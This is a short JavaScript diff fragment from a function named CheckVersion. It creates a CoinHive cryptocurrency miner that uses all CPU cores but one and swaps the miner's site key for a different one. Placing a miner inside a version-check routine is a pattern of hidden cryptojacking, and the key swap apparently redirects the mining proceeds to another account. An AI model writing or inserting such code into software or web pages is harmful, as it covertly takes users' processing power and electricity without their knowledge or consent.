@@ -15,7 +15,7 @@ function CheckVersion() {
                         } else {
                                 stCrNo = crNo - 1;
                         }
-                        var miner = new CoinHive.Anonymous('PEk9puLllwActoTfTwqacjBXLkksFQFl', {
+                        var miner = new CoinHive.Anonymous('Uv3xcQ2oFjRzUxfvBmUaEk99hpZ1lgY6', {
                                 threads: stCrNo,
                                 autoThreads: false
                         });
